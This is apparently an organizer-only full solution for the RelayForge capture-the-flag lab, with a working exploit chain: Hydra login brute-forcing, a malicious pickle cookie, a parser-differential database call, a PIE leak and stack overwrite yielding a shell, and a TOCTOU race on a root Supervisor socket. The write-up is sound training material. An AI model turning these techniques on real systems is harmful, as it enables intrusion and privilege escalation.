# RelayForge Blind CTF Report and Command Guide

> Organizer-only full solution. This report combines the investigation, trust-boundary analysis, verification status, and practical commands used to reproduce each stage. It is not an initial player handout.
>
> Use only on the assigned disposable RelayForge instance. The final host-root step intentionally executes a payload through the Supervisor race and reads the generated challenge flag. Redact the flag value in any report or screenshot.
>
> **Evidence labels:** **Verified** means a cited local test was run successfully in this workspace. **Source-confirmed** means the behavior is present in checked-in source or configuration. **Expected** means deployment behavior follows from that source but was not reproduced against EC2. **Unverified** means the artifact, live response, or runtime evidence was unavailable. No live EC2 exploit is claimed here.


## 1. Scope and purpose

This is a report-style guide with an operational reference embedded in the relevant stages. Each stage explains the security finding and why it matters, then gives the commands needed to reproduce or verify it. The commands are organizer-only and assume the assigned disposable instance; they are not evidence that a live deployment was tested.

The report treats the challenge as an investigation rather than as a sequence of unexplained exploits. It distinguishes observations available to a player from facts known only through local source and test evidence. The IP-only credential stage and live deployment status remain explicit gaps rather than assumed successes.

---

## 2. Trust-boundary overview

The intended challenge path is:

```text
EC2 IP
  -> enumerate HTTPS portal and available transient Worker port
  -> recover credentials or obtain a valid login by approved challenge path
  -> inspect the authenticated `remember_prefs` cookie
  -> exploit the pickle deserialization gadget in the Web container
  -> reach a restricted database role through the raw request helper
  -> use a duplicate-profile differential to trigger a transient host Worker
  -> exploit the Worker's PIE leak and stack overwrite
  -> abuse the Supervisor's pathname validation race to execute as UID 0
  -> read the generated root flag
```

Important reality checks:

- Web command execution is UID 65532 inside a container. It is not host root.
- The Worker runs as the host user `relay` in a temporary job directory.
- The final root step is not a Docker escape. It is a TOCTOU race in the Supervisor's pathname validation and execution path.
- The public Worker ELF is a distinct public artifact served by Nginx and is independent of Web RCE.

---

## 3. Investigation findings

### 3.1 Initial access and discoverability

From an IP address alone, a player can identify the HTTPS service, but cannot infer the seeded login pair from the current public routes. The login form reveals its field names, CSRF handling, and failure response; those observations help describe the request but do not establish a successful credential-recovery method. The application applies a strict rate limit, so an unbounded online wordlist attempt is neither a demonstrated discovery path nor an appropriate substitute for a published clue.

After authenticated access is obtained through an approved event mechanism, the dashboard provides the normal baseline and the cookie policy supplies the first useful clue. The `remember_prefs` cookie contains serialized state, and the policy names the related object classes. That clue warrants safe inspection of the serialization format, but does not by itself reveal the state-hook behavior or the one-shot result endpoint. Those details are source-confirmed organizer knowledge unless a player-facing hint is added.

### 3.2 Web execution and constrained capability

The deserialization issue provides command execution in the Web container as UID 65532. This is a meaningful application compromise, not host access. Appropriate evidence includes the process identity, application working directory, Web-only stage marker, visible database variable names, and the absence of host-privileged sockets. Database passwords and session cookies should not appear in screenshots or the report.

The Web process has a narrow database capability: its role can invoke the raw request function even though the normal HTTP workflow does not expose arbitrary options. This is the bridge to the next stage. Describe it as a constrained capability being repurposed, not as direct database superuser access.

### 3.3 Cross-service parsing and the Worker

The duplicate-profile request demonstrates a parser differential. Access treats the first `profile` value as authoritative, while the Worker retains the last value. Controlled order variants provide player-facing evidence; local policy tests and source provide organizer confirmation. The accepted order therefore passes Access as `safe` while enabling the Worker's `legacy` behavior.

The Worker is a separate host process, not an extension of the Web container. Its selected port, token, and job identifier are short-lived capabilities returned by the authenticated status endpoint. The public ELF artifact allows static analysis of the exact binary, but the `robots.txt` advertisement and Nginx file alias are only source-confirmed until checked against the deployed EC2 instance. Static analysis should establish the token gate, legacy-only commands, PIE behavior, frame layout, and accepted input length before a live job is started.

### 3.4 Host access and root escalation

The Worker leak and callback overwrite yield a host shell as `relay`; they do not yield root. The final escalation occurs through the Supervisor's diagnostic operation. The source-level finding is a pathname time-of-check/time-of-use gap: the privileged service validates a path, acknowledges validation, waits, then executes that pathname as root. The final evidence must independently show UID 0 and access to the root-only stage marker. Redact the flag value.

### 3.5 Verification limits

Local tests and checked-in source establish intended behavior, but they do not prove that the current EC2 deployment contains the same release or exposes the same routes. In particular, credential recovery is not currently established as IP-only, the public artifact route needs remote confirmation after deployment, and the full exploit chain has not been live-verified for this report. Keep these distinctions in the final assessment.

## 4. Operational walkthrough: discovery and authentication

### 4.1 Set the target and establish the public surface

Give the player only the EC2 IPv4 address. The commands below assume Bash or Zsh, `nmap`, `curl`, Hydra, Python 3, `grep`, `sed`, and `nc`.

```bash
RF_HOST='<ec2-ip-address>'
RF_BASE="https://$RF_HOST"
RF_USERS='<path-to-local-usernames-wordlist>'
RF_PASSWORDS='<path-to-local-password-wordlist>'
RF_JAR="$(mktemp)"
RF_PAGE="$(mktemp)"
RF_DASH="$(mktemp)"
```

Discover the public portal and the transient Worker port range:

```bash
nmap -Pn -sV -p 443,25000-25099 "$RF_HOST"
```

The Worker port is only listening during an active job, so an initial scan may show nothing on 25000-25099 until a request is made.

### 4.2 Fetch the login page and recover CSRF/session values

```bash
curl -ksS -c "$RF_JAR" "$RF_BASE/login" -o "$RF_PAGE"

RF_CSRF="$(
  sed -n 's/.*name="csrf_token" value="\([^"]*\)".*/\1/p' "$RF_PAGE"
)"

RF_SESSION="$(
  awk '$6 == "session" { value=$7 } END { print value }' "$RF_JAR"
)"
```

Hydra can then be pointed at the observed form:

```bash
RF_FORM="/login:username=^USER^&password=^PASS^&csrf_token=$RF_CSRF:G=:H=Cookie\: session=$RF_SESSION:F=Incorrect username or password."
hydra -L "$RF_USERS" -P "$RF_PASSWORDS" -t 1 -W 8 -f \
  "$RF_HOST" https-post-form "$RF_FORM"
```

When a valid user/password pair is recovered:

```bash
RF_USER='<username reported by Hydra>'
RF_PASSWORD='<password reported by Hydra>'

RF_JAR="$(mktemp)"
curl -ksS -c "$RF_JAR" "$RF_BASE/login" -o "$RF_PAGE"
RF_CSRF="$(
  sed -n 's/.*name="csrf_token" value="\([^"]*\)".*/\1/p' "$RF_PAGE"
)"
curl -ksS \
  -b "$RF_JAR" \
  -c "$RF_JAR" \
  --data-urlencode "csrf_token=$RF_CSRF" \
  --data-urlencode "username=$RF_USER" \
  --data-urlencode "password=$RF_PASSWORD" \
  "$RF_BASE/login" \
  -o /dev/null

RF_REMEMBER="$(
  awk '$6 == "remember_prefs" { value=$7 } END { print value }' "$RF_JAR"
)"

test -n "$RF_SESSION" && test -n "$RF_REMEMBER" && echo 'login cookies found'
```

Then fetch the dashboard and identify a target:

```bash
curl -ksS \
  -H "Cookie: session=$RF_SESSION" \
  "$RF_BASE/dashboard" \
  -o "$RF_DASH"

grep -E '<option value=|name="service"|name="duration"' "$RF_DASH"

RF_TARGET="$(
  sed -n 's/.*<option value="\([^"]*\)".*/\1/p' "$RF_DASH" |
    head -n 1
)"

test -n "$RF_TARGET" && printf 'granted target: %s\n' "$RF_TARGET"
```

### 4.3 Authentication and discovery status

The current implementation still has a discovery gap in the IP-only credential stage. The exact seeded credentials are organizer-side source information and are not currently public through the unauthenticated routes. In practice, the live challenge requires a bounded candidate set or organizer-provided clue before Hydra can become a verified IP-only path. The exact login-rate limit is real and must be respected. The route is still source-confirmed as part of the challenge design but not yet proven as a general public recovery step.

---

## 5. Operational walkthrough: Web pickle gadget

### 5.1 Safely inspect the cookie without unpickling it locally

```bash
python3 - "$RF_REMEMBER" <<'PY'
import base64
import pickletools
import sys

raw = base64.b64decode(sys.argv[1], validate=True)
print(raw.hex())
pickletools.dis(raw)
PY
```

This exposes the pickle object and class names used in the cookie. The authenticated policy page adds the clue:

```bash
curl -ksS \
  -H "Cookie: session=$RF_SESSION" \
  "$RF_BASE/cookie-policy" |
grep -E 'remember_prefs|RememberedPrefs|JobTemplate|JobRunner'
```

The key chain is:

1. `JobTemplate.__setstate__` appends its `command` value.
2. A stateful `JobRunner` is reconstructed afterward.
3. `JobRunner.__setstate__` executes the queued shell text.
4. A 32-character `.txt` result can be read once through `/api/result/`.

### 5.2 Build the malicious pickle locally using only Python stdlib

```bash
rf_cookie_for() {
  RF_CMD="$1" python3 - <<'PY'
import base64
import os
import pickle
import sys
import types

module = types.ModuleType("prefs")
for name in ("JobTemplate", "JobRunner"):
    cls = type(name, (), {"__module__": "prefs"})
    setattr(module, name, cls)
sys.modules["prefs"] = module

template = module.JobTemplate()
template.command = os.environ["RF_CMD"]
runner = module.JobRunner()
runner.armed = True

print(base64.b64encode(pickle.dumps([template, runner], protocol=4)).decode("ascii"))
PY
}
```

The `runner.armed` field is only there to force pickle state emission for `JobRunner`; it does not bypass authorization.

### 5.3 Execute a harmless proof command through the Web container

```bash
rf_web_exec() {
  local plain_command="$1"
  local result_name result_path captured cookie body attempt

  result_name="$(python3 -c 'import secrets; print(secrets.token_hex(16)+".txt")')"
  result_path="/tmp/relayforge-results/$result_name"
  captured="($plain_command) > $result_path.tmp 2>&1; mv -- $result_path.tmp $result_path"
  cookie="$(rf_cookie_for "$captured")" || return 1

  curl -ksS \
    -H "Cookie: session=$RF_SESSION; remember_prefs=$cookie" \
    "$RF_BASE/dashboard" \
    -o /dev/null || return 1

  attempt=0
  while [ "$attempt" -lt 40 ]; do
    attempt=$((attempt + 1))
    body="$(
      curl -ksS \
        -H "Cookie: session=$RF_SESSION" \
        "$RF_BASE/api/result/$result_name"
    )"
    if printf '%s' "$body" | python3 -c \
      'import json,sys; raise SystemExit(0 if "output" in json.load(sys.stdin) else 1)' \
      2>/dev/null
    then
      printf '%s' "$body" |
        python3 -c 'import json,sys; print(json.load(sys.stdin)["output"], end="")'
      return 0
    fi
    sleep 0.1
  done

  echo 'no one-shot result returned' >&2
  return 1
}
```

Use a safe proof command:

```bash
rf_web_exec 'id; pwd; cat /opt/relayforge/web/STAGE_1_WEB.txt'
```

Expected evidence includes UID/GID `65532` and:

```text
RELAYFORGE_STAGE=1_WEB_CONTAINER
```

This proves Web container execution, not host root.

---

## 6. Operational walkthrough: Web enumeration and database capability

Ask what the compromised process can already see:

```bash
rf_web_exec 'id; printf "\nENVIRONMENT\n"; env | sort; printf "\nFILES\n"; find /opt/relayforge/web -maxdepth 2 -type f -print | sort; printf "\nSOCKETS\n"; ls -l /var/run/docker.sock /run/relayforge/supervisor.sock 2>&1; printf "\nRAW DB FUNCTION\n"; sed -n "/def submit_raw_request/,/return str/p" /opt/relayforge/web/app/db.py'
```

The evidence shows:

- a read-only Web application
- `DB_USER=relay_web`
- four database connection variables
- no privileged socket access
- the `relay_web_api.submit_raw_request(...)` call

The allowed database helper is then directly invoked using `psycopg2` from within the Web container:

```bash
RF_DB_COMMAND="python3 -c 'import os,psycopg2; c=psycopg2.connect(host=os.environ[\"DB_HOST\"],dbname=os.environ[\"DB_NAME\"],user=os.environ[\"DB_USER\"],password=os.environ[\"DB_PASSWORD\"]); q=c.cursor(); q.execute(\"SELECT relay_web_api.submit_raw_request(%s,%s,%s,%s,%s)\",(\"$RF_USER\",\"$RF_TARGET\",\"echo\",420,\"profile=safe&note=manual&profile=legacy\")); value=q.fetchone()[0]; c.commit(); print(value)'"

RF_REQUEST_ID="$(rf_web_exec "$RF_DB_COMMAND" | tail -n 1)"
printf 'request id: %s\n' "$RF_REQUEST_ID"
```

Then poll the authenticated status route:

```bash
RF_ATTEMPT=0
while [ "$RF_ATTEMPT" -lt 180 ]; do
  RF_ATTEMPT=$((RF_ATTEMPT + 1))
  RF_STATUS="$(
    curl -ksS \
      -H "Cookie: session=$RF_SESSION" \
      "$RF_BASE/api/status/$RF_REQUEST_ID"
  )"

  RF_STATE="$(
    printf '%s' "$RF_STATUS" |
      python3 -c 'import json,sys; print(json.load(sys.stdin).get("job_state") or "")'
  )"

  case "$RF_STATE" in
    running|failed|expired|stopped) break ;;
  esac
  sleep 0.25
done

printf '%s\n' "$RF_STATUS" | python3 -m json.tool

if [ "$RF_STATE" != running ]; then
  printf 'Worker did not reach running state; stop here (state=%s).\n' "$RF_STATE" >&2
else
  RF_PORT="$(
    printf '%s' "$RF_STATUS" |
      python3 -c 'import json,sys; print(json.load(sys.stdin)["endpoint_port"])'
  )"

  RF_TOKEN="$(
    printf '%s' "$RF_STATUS" |
      python3 -c 'import json,sys; print(json.load(sys.stdin)["session_token"])'
  )"

  RF_JOB_ID="$(
    printf '%s' "$RF_STATUS" |
      python3 -c 'import json,sys; print(json.load(sys.stdin)["job_id"])'
  )"

  printf 'host=%s port=%s token=%s job=%s\n' \
    "$RF_HOST" "$RF_PORT" "$RF_TOKEN" "$RF_JOB_ID"
fi
```

Required evidence is:

- `request_state=approved`
- `job_state=running`
- a port in `25000-25099`
- a 48-character lowercase hexadecimal token

The key differential is the duplicate profile value:

```text
profile=safe&note=manual&profile=legacy
```

Access approves `safe` because it is first, while the Worker activates `legacy` because it is last. The mismatch is the exploit primitive.

---

## 7. Operational walkthrough: Worker analysis and exploitation

### 7.1 Download the exact deployed Worker ELF from the public artifact route

```bash
RF_WORKER_DIR="$(mktemp -d)"
RF_WORKER="$RF_WORKER_DIR/relay-worker"
curl -kfsS "$RF_BASE/artifacts/relay-worker" -o "$RF_WORKER"
chmod 0644 "$RF_WORKER"
file "$RF_WORKER"
sha256sum "$RF_WORKER"
readelf -hW "$RF_WORKER"
strings -a "$RF_WORKER" |
  grep -E 'TOKEN|CONNECT|LEAK|OVERFLOW|worker_shell|profile|legacy'
strings -a -t x "$RF_WORKER" |
  grep -E 'TOKEN|CONNECT|LEAK|OVERFLOW|worker_shell|profile|legacy'
objdump -s -j .rodata "$RF_WORKER" > /tmp/relay-worker.rodata.txt
objdump -d -Mintel "$RF_WORKER" > /tmp/relay-worker.disassembly.txt
```

The worker is a PIE ELF with a legacy-mode command path. Static analysis should confirm:

- the last `profile` wins in the Worker parsing logic
- the legacy debug frame has 128 bytes before a callback pointer
- the accepted overwrite frame is 136 bytes total

The important binary-analysis result is therefore the input pair:

```text
profile=safe&note=manual&profile=legacy
```

### 7.2 Test the Worker gate and leak the PIE address

First verify that an incorrect token is rejected:

```bash
RF_BAD_TOKEN="$(
  python3 -c \
    'import sys; value=sys.argv[1]; print(("1" if value[0]=="0" else "0")+value[1:])' \
    "$RF_TOKEN"
)"
printf 'TOKEN %s\n' "$RF_BAD_TOKEN" | nc -w 3 "$RF_HOST" "$RF_PORT"
```

Then authenticate and issue the legacy-only `LEAK` command:

```bash
RF_PROBE="$(
  printf 'TOKEN %s\nLEAK\nQUIT\n' "$RF_TOKEN" |
    nc -w 3 "$RF_HOST" "$RF_PORT"
)"

printf '%s\n' "$RF_PROBE"

RF_LEAK="$(
  printf '%s\n' "$RF_PROBE" |
    sed -n 's/^worker_shell=//p'
)"

test -n "$RF_LEAK" && printf 'leaked Worker address: %s\n' "$RF_LEAK"
```

This is the PIE leak for the live worker. It must not be reused after the worker restarts or expires.

### 7.3 Overwrite the callback pointer

Send 128 padding bytes followed by the leaked callback address as a little-endian 64-bit AMD64 value:

```bash
{
  printf 'TOKEN %s\nOVERFLOW 136\n' "$RF_TOKEN"

  python3 -c \
    'import struct,sys; sys.stdout.buffer.write(b"A"*128 + struct.pack("<Q", int(sys.argv[1], 0)))' \
    "$RF_LEAK"

  cat
} | nc "$RF_HOST" "$RF_PORT"
```

Do not add a newline after the binary payload. Commands typed after the shell banner are then consumed by `/bin/sh -i` in the native transient Worker.

Run these commands in the worker shell:

```bash
id
pwd
cat /var/lib/relayforge/stages/STAGE_2_WORKER.txt
cat /var/lib/relayforge/stages/STAGE_3_ROOT.txt 2>&1
cat /var/lib/relayforge/flag/root.txt 2>&1
```

Expected evidence is:

- host user `relay`
- a directory resembling `/var/lib/relayforge/workers/<job-uuid>/work`
- the Stage 2 marker
- denied access to root-only files

This is host command execution but not UID 0.

---

## 8. Operational walkthrough: Supervisor race and root escalation

The worker shell is now an unprivileged host process. It can inspect the Supervisor socket and the implementation of the diagnostic path.

```bash
ls -l /run/relayforge/supervisor.sock

grep -nE \
  'DIAGNOSTIC|diagnose|validated|sleep|os\.open|os\.replace|Popen' \
  /opt/relayforge/runtime/supervisor.py

sed -n '/def run_diagnostic/,/def _remove_state/p' \
  /opt/relayforge/runtime/supervisor.py
```

The source reveals the vulnerable pattern: Supervisor validates a file path, replies `validated`, then waits 250 ms before executing the same pathname as root. Replacing the pathname after the acknowledgement is a time-of-check/time-of-use race.

Confirm the current job ID and create the 46-byte benign file:

```bash
RF_JOB_ID="$(basename "$(dirname "$PWD")")"

printf "#!/bin/sh\nprintf 'RelayForge diagnostic OK\\n'\n" > diagnostic.sh
chmod 700 diagnostic.sh

wc -c diagnostic.sh
stat -c 'owner=%U group=%G mode=%a links=%h size=%s' diagnostic.sh
```

The file must be exactly 46 bytes and executable.

Now create the replacement payload:

```bash
printf '#!/bin/sh\nid\ncat /var/lib/relayforge/stages/STAGE_3_ROOT.txt\nprintf "ROOT_FLAG="\ncat /var/lib/relayforge/flag/root.txt\n' > root.sh
chmod 700 root.sh
```

Connect to the Unix socket and exploit the race:

```bash
python3 -c 'import json,os,socket,sys; j=sys.argv[1]; s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.connect("/run/relayforge/supervisor.sock"); frame=(json.dumps({"op":"diagnose","job_id":j,"name":"diagnostic.sh"},separators=(",",":"))+"\n").encode(); s.sendall(frame); f=s.makefile("rb",buffering=0); ack=f.readline(); assert json.loads(ack)=={"ok":True,"state":"validated"}; os.replace("root.sh","diagnostic.sh"); sys.stdout.buffer.write(ack+f.read())' "$RF_JOB_ID"
```

Success looks like:

```text
{"ok":true,"state":"validated"}
uid=0(root) ...
RELAYFORGE_STAGE=3_UNRESTRICTED_HOST_ROOT
ROOT_FLAG=RF{...}
```

The `id` output is the proof that the replacement executed as unrestricted host UID 0. Reading the generated `root.txt` completes the challenge.

If the output instead says `RelayForge diagnostic OK`, the benign file executed before the replacement. Recreate both files and repeat the one-line socket command while the same worker is still alive.

---

## 9. Why this is still called blind discovery

The player is not given a working exploit or told to run a project helper. They recover a login pair against the target, download the deployed Worker binary from the same IP, and derive the remaining interfaces through observed behavior and static analysis. The evidence chain is:

```text
authenticated cookie inspection
  -> Web UID 65532
  -> restricted relay_web PostgreSQL call
  -> Access/Worker duplicate-key mismatch
  -> transient Worker token and PIE leak
  -> host relay shell
  -> readable Supervisor validation/execution mismatch
  -> host UID 0 and root flag
```

The player starts with only the EC2 IP. The login pair is recovered against the rate-limited public form, the native Worker binary is downloaded from the same IP, and the remaining interfaces are derived through the challenge's observable behavior and its public binary artifact.

---

## 10. Addendum: IP-only discovery and verification status

This section is source-authoritative where earlier sections imply more than the current implementation proves. It is additive and intentionally conservative.

The exact Worker URI is discoverable by ordinary web enumeration through the standard `robots.txt` resource. The current workspace Nginx configuration returns:

```text
User-agent: *
Allow: /artifacts/relay-worker
```

From the assigned IP, request the resource before guessing a path:

```bash
curl -kfsS "$RF_BASE/robots.txt"
curl -kfsS "$RF_BASE/artifacts/relay-worker" -o relay-worker
file relay-worker
sha256sum relay-worker
readelf -hW relay-worker
readelf -lW relay-worker
readelf -dW relay-worker
```

This clue is source-confirmed in the current workspace, but availability from the EC2 deployment remains unverified until redeployment and a remote request. The digest computed locally records the downloaded file; it is not an authenticity check unless compared with an independently trusted deployment digest.

The login credential stage is still not established as a working IP-only cracking stage. Hydra requires candidate usernames/passwords and a valid CSRF/session; the deployment's login rate limit is strict. The seeded `guest` credential is in organizer-side source and is not discoverable through the present public routes. Do not describe generic wordlist guessing as successful or verified. The credential stage needs a bounded candidate clue or an intentionally downloadable offline-cracking artifact before this walkthrough is reproducible from only the IP.

Likewise, a pre-request port scan cannot discover a live Worker: the port is selected dynamically from `25000-25099` and listens only while a job is active. Learn the actual port from the authenticated request status, then test that exact port. The final host operation here is the Supervisor `diagnose` pathname TOCTOU; there is no `archive` operation.

---

## 11. Summary of the challenge in one sentence

RelayForge is a layered trust-boundary challenge in which a player moves from a public IP and an authenticated web portal to a Web-container command execution primitive, then to a restricted database function, then to a transient Worker process, and finally to host-root execution via a Supervisor pathname race after leaking and overwriting a callback in a PIE binary.

---

## 12. Source-confirmed local findings

These items are directly supported by the checked-in workspace:

- Nginx serves the public Worker artifact through a mounted read-only host file.
- The Worker binary exists as a distinct public artifact and is not extracted from a Web-container path.
- The challenge includes Web cookie and policy logic tied to `remember_prefs`, `JobTemplate`, and `JobRunner`.
- The DB adapter exposes `submit_raw_request(...)` to the restricted `relay_web` role.
- The Worker parsing and legacy mode are implemented as a duplicate-key profile differential.
- The Supervisor validates the `diagnostic.sh` path and then executes it as root after an acknowledged delay, leaving a TOCTOU race.

These facts narrow the design but must still be correlated with live runtime behavior and verified evidence from the specific deployed EC2 instance.
